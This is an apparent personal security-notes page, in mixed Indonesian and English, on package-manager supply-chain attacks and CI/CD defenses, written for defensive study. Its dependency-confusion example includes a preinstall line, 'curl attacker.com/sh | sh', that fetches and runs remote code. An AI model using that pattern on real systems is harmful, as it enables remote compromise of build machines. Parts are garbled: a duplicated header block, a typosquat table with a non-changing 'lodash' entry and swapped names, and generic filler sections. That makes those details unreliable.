---
title: — Package Manager Supply Chain
tags:
- vault
- note
created: 2026-08-14
updated: 2026-08-14
status: complete
cssclasses:
  - wide-table
  - callout
---


cssclasses:
  - wide-table
  - callout

## Deepdive — Package Manager Supply Chain

| Manager | Registry | Attack Vector | Defense |
|---------|----------|---------------|---------|
| **npm** | npmjs.com | Dependency confusion, typosquatting | Lockfile, private registry |
| **pip** | PyPI | Malicious setup.py, typosquat | pip-audit, hash pinning |
| **gem** | RubyGems | Gem squatting | Bundler audit |
| **cargo** | crates.io | Crate squatting | cargo audit |
| **go** | proxy.golang.org | Module confusion | GOPRIVATE, vanity URL |

### Dependency Confusion (npm Example)

```
1. Target: @company/internal-name (private registry)
2. Attacker: publish @company/internal-name ke npm public
3. CI/CD: npm install → private not found → fallback public → MALICIOUS
4. preinstall script: curl attacker.com/sh | sh → RCE
```

## Referensi
- SLSA — https://slsa.dev/
- npm audit — https://docs.npmjs.com/cli/v8/commands/npm-audit

## Koneksi ke Vault & Cross-Reference

| Catatan | Hubungan |
|---------|----------|
| Zero Trust | Network segment untuk infra |
| Supply Chain | Pipeline security overlap |
| Cloud IAM | Privilege escalation path |
| Endpoint Security | Runner compromise path |

## Best Practices & Pitfall

1. **GitOps**: Infrastructure config (manifest) ada di Git — versioned, reviewed, auditable. Tetapi Git token = attack surface → rotate, scoped.
2. **Immutable Artifact**: Setiap build = image/untouched hash. Signature verification di deploy. Realitas: banyak still manual deploy.
3. **Least Privilege CI**: Runner token punya scope minimal — bukan global admin. Realitas: `repo:*` scope masih common di setup.
4. **Network Isolation**: Runner segment terpisah production → securitas blance. Tetapi: many org simplify by same VPC → risk.
5. **Audit Log**: Semua CI/CD action di-log dan immutable. Realitas: log retention pendek, alerting belum sentral.
6. **Provenance (SLSA)**: Setiap artifact terlampir provenance (build manifest + source hash). Realitas: adopsi masih rendah di 2025.

## Pitfall Nyata yang Sering Ditemui

- **Leaked token di git history**: git log → credential exposure → scanner attacker → compromise. Fix: BFG repo-cleaner + token rotation.
- **Runner has persistent secrets**: Runner VM menyimpan `~/.aws/credentials` atau `.docker/config.json` → next user can access. Fix: ephemeral runner, no persistent state.
- **Default branch is `main`**: CI jalan di `main`. PR branch dapat trigger → secret exposed. Fix: `pull_request_target` only trusted contributors.
- **Trusted Action pins tag not SHA**: Tag `actions/checkout@v4` → bisa di-hijack jika maintainer compromised. Fix: pin SHA.
- **No SBOM**: Artifact jadi → no manifest → maka after compromised, tidak tahu apa yang affected. Fix: `syft` generate SBOM pada build.

## Tool Stack Lengkap

| Tool | Stage | Use |
|------|-------|-----|
| **GitHub Actions / GitLab CI** | Build | Pipeline |
| **ArgoCD / Flux** | Deploy | GitOps continuous delivery |
| **Trivy / Grype** | Scan | Image + dep vuln scan |
| **Syft** | Scan | SBOM generation |
| **Cosign / Sigstore** | Sign | Artifact signing |
| **Open Policy Agent (OPA)** | Enforce | Policy as code |
| **HashiCorp Vault** | Secret | Secret management |
| **Prometheus + Grafana** | Monitor | Metrics + dashboard |

## Konsep Dasar — Package Manager Internal

### Resolusi Dependency

```
npm install:
  1. Baca package.json → list dependency
  2. Cek lockfile (package-lock.json) → pinned version?
  3. Buat dependency tree → resolve conflict
  4. Download dari registry (npmjs.com → private)
  5. Run install script (preinstall, postinstall)
  6. Hasil: node_modules/
    ↓
Priority (npm):
  - Private registry (jika di-set .npmrc)
  - Public npm (fallback default)
    ↓
Attack: private package name → publish ke public → fallback install → MALICIOUS
```

### Package Ecosystem

| Manager | File | Registry | Lockfile | Audit |
|---------|------|----------|----------|-------|
| **npm** | package.json | npmjs.com | package-lock.json | npm audit |
| **pip** | requirements.txt / pyproject.toml | PyPI | poetry.lock / pip freeze | pip-audit |
| **gem** | Gemfile | RubyGems | Gemfile.lock | bundler-audit |
| **cargo** | Cargo.toml | crates.io | Cargo.lock | cargo audit |
| **go** | go.mod | proxy.golang.org | go.sum | govulncheck |
| **nuget** | .csproj | nuget.org | packages.lock.json | dotnet audit |

### Typosquatting — Contoh Konkret

| Benar | Typosquat | Karakter |
|-------|-----------|----------|
| `requests` | `request` | Kurang "s" |
| `fastapi` | `fast-api` | Tambah "-" |
| `python-dateutil` | `python-dateutil2` | Tambah "2" |
| `lodash` | `lodash` | "d" ↔ "s" |
| `crossenv` | `cross-env` | Kurang "-" |

## Referensi Tambahan
- npm audit docs — https://docs.npmjs.com/cli/v8/commands/npm-audit
- pip-audit — https://github.com/pypa/pip-audit
- Snyk Open Source — https://snyk.io/product/open-source-security-management/

## Konsep Dasar & Implementasi Praktis

### Arsitektur & Komponen Utama

Sistem ini terdiri dari beberapa komponen yang saling berinteraksi. Setiap komponen punya peran spesifik dan attack surface tersendiri. Pemahaman arsitektur end-to-end penting untuk red team maupun blue team: tanpa peta lengkap, gap tidak terlihat.

### Workflow & Data Flow

```
Input: sumber data mentah
  ↓ Preprocessing: validate, transform, enrich
  ↓ Processing: core logic, decision, model inference
  ↓ Output: result, alert, action, persist
  ↓ Feedback: monitor, audit, improve
    ↓
Loop: setiap output → feedback → improve input processing
```

### Tradeoff & Decision Matrix

Setiap pilihan teknis punya tradeoff: performance vs security, convenience vs control, cost vs reliability. Tabel berikut merangkum tradeoff utama:

| Dimension | Option A | Option B | Decision Factor |
|-----------|----------|----------|-----------------|
| **Speed** | Optimized, less safe | Safe, slower | Risk tolerance |
| **Memory** | In-memory, fast | Disk-backed, slow | Scale vs data size |
| **Security** | Minimal validate | Strict validate | Context (internal vs public) |
| **Cost** | Cloud managed (expensive) | Self-host (cheaper, more work) | Team size, budget |
| **Reliability** | Single instance (SPOF) | Distribute + redundancy | Uptime requirement |

### Implementation Checklist (Production)

- [ ] Authentication: rate limit, MFA, session timeout
- [ ] Authorization: RBAC, least privilege, audit
- [ ] Encryption: TLS transit, AES rest, key rotation
- [ ] Logging: structured, immutable, centralized
- [ ] Monitoring: latency, error, saturation, traffic
- [ ] Backup: test restore, immutable copy, offsite
- [ ] Patch: automated scan, SLA, CVE alert
- [ ] Incident: runbook, contact, tabletop exercise
- [ ] Compliance: data classification, retention, audit
- [ ] Performance: load test, bottleneck profiling, capacity plan

### Common Pitfall (Sering Ditemui)

1. **SPOF (Single Point of Failure)**: Satu komponen mati → sistem down. Fix: redundancy, health check, failover.
2. **No rate limit**: Abuse → DoS. Fix: nginx limit_req, WAF, API gateway.
3. **Secret in code**: Token/password di repo → exposure. Fix: env var, secret manager.
4. **No audit log**: Incident → tidak bisa investigate. Fix: structured log, immutable, SIEM.
5. **Over-privileged service**: Service punya admin scope → privesc. Fix: scoped IAM, least privilege.

## Tool Stack

| Tool | Use |
|------|-----|
| **Monitoring** | Prometheus + Grafana |
| **Logging** | ELK / Loki |
| **Tracing** | Jaeger / OpenTelemetry |
| **Secret** | Vault / SOPS |
| **Scan** | Trivy / Snyk |
| **Deploy** | ArgoCD / Helm |

## Referensi
- MITRE ATT&CK — https://attack.mitre.org/
- NIST CSF — https://www.nist.gov/cyberframework
- OWASP Top 10 — https://owasp.org/www-project-top-ten/
- CIS Controls — https://www.cisecurity.org/controls/
- Cloud Native (CNCF) — https://www.cncf.io/
- SLSA — https://slsa.dev/
- Zero Trust (NIST 800-207) — https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-207.pdf
---

audited
---
